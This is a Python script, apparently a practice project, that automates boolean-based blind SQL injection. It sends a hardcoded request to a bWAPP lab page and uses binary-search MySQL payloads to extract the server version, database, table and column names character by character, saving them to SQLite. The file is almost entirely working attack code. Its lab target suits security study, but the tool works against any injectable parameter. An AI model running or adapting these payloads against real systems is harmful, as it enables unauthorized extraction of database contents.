# -*- coding: utf-8 -*-   
from time import sleep
import sys
# import pandas as pd
import urllib
import requests
import warnings
import argparse
import sqlite3

import uuid

warnings.filterwarnings('ignore')

output_check = False
args = None
true_message_size = None # 참(ture)의 경우 message size

# DB
cursor = None
conn = None
id_index = 0



REQUEST_STRING = """
GET /bWAPP/sqli_1.php?title=iron1'+or+('iron'+=+case+when+1=1+then+'iron'+end)+--+&action=search HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: keep-alive
Host: 192.168.219.100:8080
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://192.168.219.100:8080/bWAPP/sqli_1.php
Cookie: PHPSESSID=a36649a968899375505575e70dac447a; security_level=0


"""

def get_argument():
	parser = argparse.ArgumentParser()
	parser.add_argument("-s",dest="schema", help="http? https?")
	parser.add_argument("-p", dest="parameter", help="target param")
	parser.add_argument("-d", dest="result_db", help="Database name for storing results ex) -d result_db.db")
	parser.add_argument("--proxy", dest="proxy", help="Use a proxy to connect to the target URL")
	parser.add_argument("--dbms", dest="dbms", help="SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL")
	parser.add_argument("--basic", action="store_true", help="Basic info extraction")
	parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
	parser.add_argument("--tables", action="store_true", help="Enumerate Tables")
	parser.add_argument("--columns", action="store_true", help="Enumerate columns")

	options = parser.parse_args()
	if not options.parameter or not options.schema:
		parser.error("[-] Missing required parameters: --param, --schema are required. Use --help for more info.")
	return options

def result_db_create(name):
	global cursor, conn
	conn = sqlite3.connect(name) 
	cursor = conn.cursor()

def result_table_create():
	cursor.execute('CREATE TABLE IF NOT EXISTS dbs_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255))')
	cursor.execute('CREATE TABLE IF NOT EXISTS table_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255))')
	cursor.execute('CREATE TABLE IF NOT EXISTS column_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), column_name VARCHAR(255))')
	# cursor.execute('CREATE TABLE data (id INTEGER PRIMARY KEY AUTOINCREMENT, DB VARCHAR(255), table_ VARCHAR(255), column VARCHAR(255), data VARCHAR(255))')

def result_set_name(First): # 중복코드 추후 수정
	global id_index
	id_index += 1
	
	if args.dbs:
		db_data = cursor.execute(f"INSERT OR REPLACE INTO dbs_info (id, db_name) VALUES ('{id_index}','{First}')")
		conn.commit()
	elif args.tables:
		db_data = cursor.execute(f"INSERT OR REPLACE INTO table_info (id, table_name) VALUES ('{id_index}','{First}')")
		conn.commit()
	elif args.columns:
		db_data = cursor.execute(f"INSERT OR REPLACE INTO column_info (id, column_name) VALUES ('{id_index}','{First}')")
		conn.commit()

def result_get_name():
	list_1 = []

	if args.dbs:
		cursor.execute(f"SELECT db_name FROM dbs_info")
		rows = cursor.fetchall()
		for row in rows:
			list_1.append(row[0])
	
	return list_1

	# elif args.tables:
	# 	cursor.execute(f"11")
	# elif args.columns:
	# 	cursor.execute(f"11")

def url_encode(item):
	return urllib.parse.quote(item).replace('%20', '+').replace('%3D', '=').replace('%27', '\'').replace('%28','(').replace('%29',')').replace('%3E', '>').replace('%2C', ',').replace('%3C', '<')

def url_decode(item):
	return urllib.parse.unquote(item).replace('+', ' ')

def parse_request(request):
	lines = request.split("\n") # 한줄씩 쪼개서 넣기
	method, path_param, http_ver = lines[1].split() # POST /v1/groups/814a75c9-f187-48c8-8c01-a9805212db0e/files/details?AAA=aaa&BBB=bbb HTTP/2
	headers = {} # 헤더 딕셔너리
	data = {} # GET 파라미터 딕셔너리
	path, param_tmp = path_param.split("?") # param = AAA=aaa&BBB=bbb
	param = param_tmp
	if method == 'GET': # GET방식일경우 
		for line in lines[2:]:
			if ":" in line:
				key, value = line.split(": ")
				headers[key] = value # 딕셔너리에 {헤더 : 값}
		for get_param in param.split("&"):
			key, value = get_param.split("=", 1)
			data[key] = value # 딕셔너리에 {파라미터 : 값}
		url = headers['Host']   
		condition = url_decode(data[args.parameter])

	else: # 이외 POST 등 일경우 body 값 파싱
		headers_string, data_string = REQUEST_STRING.split("\n\n")
		for line in headers_string.split("\n"):
			if ":" in line:
				key, value = line.split(": ")
				headers[key] = value
		for param in data_string.split("&"):
			key, value = param.split("=")
			data[key] = value
	# data[args.parameter] = condition.replace('1=1', payloads['len']) # 조건식에서 1=1 을 찾아서 payload로 변경 후 data에 삽입
	# print(data[args.parameter])
	return (
	{
		'method': method,
		'url': url,
		'path': path,
		'headers': headers,
		'data': data,
	}, condition
)
def payload_set(condition, payloads):
	result_payload = {}
	for key, value in payloads.items():
		payload_tmp = condition.replace('1=1', value)
		result_payload[key] = payload_tmp

	return result_payload

def setpayload():
	global output_check

	dbms = args.dbms.lower()

	if dbms == 'oracle':
		if args.basic:
			print("[*] Oracle 기본 정보 출력 Start")
			payloads = {

			}
		elif args.dbs:
			print("[*] Oracle DB 출력 Start")
			payloads = {

			}
		else:
			print("Use --help for more info. (oracle)")

	elif dbms == 'mysql':
		if args.basic:
			print("[*] MySQL 기본 정보 출력 Start")
			payloads = {
				'len': "(SELECT length((SELECT @@version)))>{mid_val}",
				'version' : "ascii(substr((SELECT @@version),{substr_index},1))>{mid_val}"      
			}
		if args.dbs:
			print("[*] MySQL DB 출력 Start")
			payloads = {
				'count' : "(SELECT count(*) FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema'))>{mid_val}",
				'len' : "(SELECT length((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1)))>{mid_val}",
				'dbs' : "ascii(substr((SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN('mysql','information_schema') LIMIT {rows},1),{substr_index},1))>{mid_val}"
			}
		if args.tables:
			print("[*] MySQL 테이블 출력 Start")
			payloads = {
				'count' : "(SELECT count(*) FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema')>{mid_val}",
				'len' : "(SELECT length((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT {rows},1)))>{mid_val}",
				'tables' : "ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT {rows},1),{substr_index},1))>{mid_val}"
			}
		if args.columns:
			print("[*] MySQL 컬럼 출력 Start")
			payloads = {
				'count' : "(SELECT count(*) FROM information_schema.columns WHERE table_name='{table_name}')>{mid_val}",
				'len' : "(SELECT length((SELECT table_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {rows},1)))>{mid_val}",
				'columns' : "ascii(substr((SELECT table_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {rows},1),{substr_index},1))>{mid_val}"
			}
		else:
			print("Use --help for more info. (mysql)")

	# elif dbms == 'mssql':
	# 	if args.basic:
	# 		print("[*] MSSQL 기본 정보 출력 Start")
	# 		payloads = "----------------------------------------"
	# 	elif args.dbs:
	# 		print("[*] MSSQL DB 출력 Start")
	# 		payloads = "----------------------------------------"
	# 	else:
	# 		print("Use --help for more info. (mssql)")

	# elif dbms == 'postgresql':
	# 	if args.basic:
	# 		print("[*] PostgreSQL 기본 정보 출력 Start")
	# 		payloads = [
	# 			# "'||(CASE WHEN ascii(substr((SELECT version()),{substr_index},1))>{mid_val} THEN '{message}' ELSE 'Characterization' END)||'",
	# 			# "'||(CASE WHEN ascii(substr((SELECT version()),{substr_index},1))>{mid_val} THEN '{message}' ELSE '11111' END)||'"
	# 		]
	# 	elif args.dbs:
	# 		print("[*] PostgreSQL DB 출력 Start")
	# 		payloads = "----------------------------------------"
	# 	else:
	# 		print("Use --help for more info. (postgresql)")

	# else:
	# 	print("Unsupported DBMS. Use --help for more info.")
	
	return payloads

def check_condition(data, method, url, path, headers):
	global true_message_size
	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
	proxies = {'http': args.proxy, 'https': args.proxy}
	timeout = 30
	if method == 'GET':
		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
		true_message_size = len(response.content)
	else:
		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
	
def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows=None, table_name=None, column_name=None):

	# print(table_name)
	mid_val = int((min_val+max_val)/2)
	payload_insert = payload_fix
	payload_insert = payload_insert.format(rows=rows, substr_index=substr_index, mid_val=mid_val, table_name=table_name, column_name=column_name)
	data_val['data'][args.parameter] = payload_insert
	
	bin_result = connection(**data_val) # payload 삽입 및 요청
	if max_val - min_val <= 1:
		if bin_result:
			return max_val
		return min_val         
	if bin_result: # 30 130 160 / 2 = 80
		return recursive(mid_val, max_val, data_val, payload_fix, substr_index, rows, table_name, column_name)
	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows, table_name, column_name)
		
def connection(data, method, url, path, headers):
	data[args.parameter] = url_decode(data[args.parameter])
	data[args.parameter] = url_encode(data[args.parameter])
	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
	# print(params)
	proxies = {'http': args.proxy, 'https': args.proxy}
	timeout = 30
	if method == 'GET':
		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
	else:
		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)

	if true_message_size == len(response.content):
		return 1    # true
	return 0    # false

def query_start():
	result_table_create()
	payloads = setpayload()
	data, condition = parse_request(REQUEST_STRING)
	check_condition(**data)
	result_payload = payload_set(condition, payloads)

	name_str = "" # 한문자 씩 찾아서 저장할 변수
	# name_tmp = [] #  name_str 에 저장된 변수를 append 할 배열변수


	row_count = 1 # 행 개수
	row_data = [] # 행 배열
	col_count = 1 # 열 개수
	col_data = [] # 열 배열
	table_name = []
	data_len  = 0
	dic = {} # name_str_list 2차원 배열을 엑셀에 넣기위해 딕셔너리형으로 변환 해서 넣을 변수

	row_count = recursive(0, 127, data, result_payload['count'],None, None, table_name)
	name_str_list =[[None] * 1 for _ in range(row_count)] # 2차원 배열 생성 열을 지정할 방법 생각해야됨
	print("[*] 총 레코드 수 : " + str(row_count))

	for rows in range(0, row_count, 1): # range(row_count)로 해도됨
		for key, value in result_payload.items():
			if key == 'count':
				continue
			elif key == 'len':
				data_len  = recursive(0, 127, data, value, None, rows, table_name)
				print("테이블 이름 길이 : " + str(data_len))
			else:
				name_str = ""
				for substr_index in range(0, data_len, 1):
					name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, table_name))
					name_str_list[rows][0] = name_str
					print(name_str)
				table_name = result_set_name(name_str)
				
				print(f"[+] {rows+1} 행 출력 : {name_str}")
 
	# for rows in range(0, row_count, 1): # range(row_count)로 해도됨

	# 	for cols in range(0, row_count, 1):
	# 		print(cols)
	# 		for key, value in result_payload.items():
	# 			if key == 'count':
	# 				continue
	# 			elif key == 'len':
	# 				data_len  = recursive(0, 127, data, value, None, rows, None)
	# 				# print("길이 : " + str(data_len))
	# 			else:
	# 				name_str = ""
	# 				for substr_index in range(0, data_len, 1):
	# 					name_str += chr(recursive(0, 127, data, value, substr_index+1, rows, None))
	# 					name_str_list[rows][0] = name_str
	# 					# print(name_str)
	# 				print(f"[+] {rows+1} 행 출력 : {name_str}")
	

		# 			print(name_str)
		# name_tmp.append(name_str)
		# name_str = ""
		# name_str_list[rows][0] = name_tmp
		# name_tmp = []

	print("\n[*] 최종 데이터 출력")
	for i in name_str_list :
		for j in i:
			print(j,end=" ")
		print()
	
	conn.close()

if __name__ == '__main__':
	args = get_argument()
	print(args)
	result_db_create(args.result_db)

	print ("=================================================================")
	print ("Blind SQL Injection START")
	print ("=================================================================")
	# print(f"DB 파일명 : {uuid}")
	# print ("=================================================================")
	query_start()
